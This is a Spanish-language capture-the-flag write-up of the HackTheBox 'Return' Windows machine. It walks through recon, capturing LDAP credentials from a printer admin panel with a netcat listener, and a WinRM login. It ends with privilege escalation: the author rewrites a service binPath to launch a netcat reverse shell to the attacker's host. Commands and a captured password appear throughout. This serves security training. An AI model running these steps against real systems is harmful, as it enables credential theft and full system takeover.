@@ -1,0 +1,163 @@
+---
+title: 'CTF - Return WriteUp'
+date: '2022-02-11'
+tags: ["CTF", "Windows", "ServerOperatorGroupAbusing", "ServiceConfigurationManipulation", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Estamos ante una máquina Windows Esto es algo que deducimos una vez hacemos un Ping para comprobar 
+---
+
+Estamos ante una máquina **Windows**. Esto es algo que deducimos una vez hacemos un Ping para comprobar la conexión que tenemos con ella.
+
+
+```
+❯ ping 10.10.11.108 -c 1
+PING 10.10.11.108 (10.10.11.108) 56(124) bytes of data.
+64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=43.2 ms
+```
+En la traza ICMP observamos que el TTL es de 127. Las maquinas Windows, en general, tienen un TTL configurado de 128 mientras que las máquinas Linux suelen tener un TTL de 64. En este caso, hasta llegar a la máquina pasamos por un nodo intermediario y por eso el TLL se descuenta en 1 unidad.
+
+Tras un primer escaneo de puertos con NMAP, aparecen muchos de ellos abiertos. Además, en Windows este tipo de escaneos se suele demorar un poco más. Una vez escaneados los puertos abiertos con TCP Syn Scan, trato de sacar el máximo de información posible utilizando scripts básicos de reconocimiento de NMAP, para ver que información nos facilita.
+
+
+```
+nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,59851 -sCV -v 10.10.11.108 -oN targeted
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: HTB Printer Admin Panel
+135/tcp   open  msrpc         Microsoft Windows RPC
+...
+```
+Hay un portal web abierto en el puerto 80 y parece un panel de administración de impresoras. Navegando un poco por la plataforma, veo un formulario de registro.
+
+En estos casos donde el formulario te permite introducir una IP, una buena prueba es ponerte en escucha para ver que información te envía el servidor.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-7.png)Cambio la dirección IP a mi equipo y me pongo en escucha en el mismo puerto con netcat.
+
+
+```
+❯ nc -lvp 389
+listening on [any] 389 ...
+10.10.11.108: inverse host lookup failed: Unknown host
+connect to [10.10.14.21] from (UNKNOWN) [10.10.11.108] 59872
+0*`%return\svc-printer�
+                       1edFg43012!!
+```
+Parece una contraseña. Me la guardo junto con el usuario *return\svc-printer*.
+
+Además, recuerdo que el puerto RPC estaba abierto. Podría probar a conectarme con [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).
+
+
+```
+❯ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
+Evil-WinRM shell v3.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents whoami
+return\svc-printer
+```
+Y listo. Obtenemos la primera flag.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\documents cat ../desktop/user.txt
+6df0ae750542xxxxxxxxxxxxxxxxxxx 
+```
+El siguiente paso es buscar un método que nos permita escalar privilegios de Administrator. En este punto, un buen comienzo es enumerar los privilegios que dispone el usuario actual.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+```
+[SeLoadDriverPrivilege](https://www.tarlogic.com/es/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/) tiene vulnerabilidades conocidas que se podrían explotar, pero voy a continuar buscando información sobre los grupos a los que pertenezco.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop net user svc-printer
+...
+Local Group Memberships      *Print Operators      *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+Confirmamos que estamos en el grupo de *Remote Management Use* (por eso podemos conectarnos con WinRM) y además pertenezco a otros grupos. Me parece interesante *Server Operators* porque tal y como se visualiza en la web de [Microsoft](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators), vemos que tiene capacidad de parar y ejecutar servicios.
+
+Esto es una vulnerabilidad que se puede explotar porque los servicios son capaces de ejecutar binarios en su arranque. De esta forma, sería interesante configurar un servicio que ejecutase *nc.exe* con el fin de entablar una reverse shell a mi máquina atacante.
+
+Lo primero es traer a la máquina Windows el binario *nc.exe*.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop upload /home/iocio/Desktop/iocio/HTB/Return/content/nc.exe
+```
+Y trato de crear el nuevo servicio de Windows.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.21 443"
+[SC] OpenSCManager FAILED 5:
+Access is denied.
+```
+Parece que por alguna razón no podemos crear servicios. Vamos a intentar cambiar uno existente. Para ello, enumeramos aquellos que ya hay en ejecución.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\documents services
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
+"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
+```
+Tras probar a cambiar varios y ver que no me permite modificarlos, doy con uno que sí.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.21 443"
+[SC] ChangeServiceConfig SUCCESS
+```
+A continuación, pongo en mi máquina netcat en escucha, paro el servicio y lo vuelvo a arrancar.
+
+
+```
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop sc.exe stop VMTools
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop sc.exe start VMTools
+```
+Recibimos la consola por el otro lado.
+
+
+```
+C:\Windows\system32whoami  
+nt authority\system
+C:\Windows\system32type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+f8fexxxxxxxxxxxxxxxxxxxxxxx
+```
+Obtenemos la flag y terminamos la máquina.
+
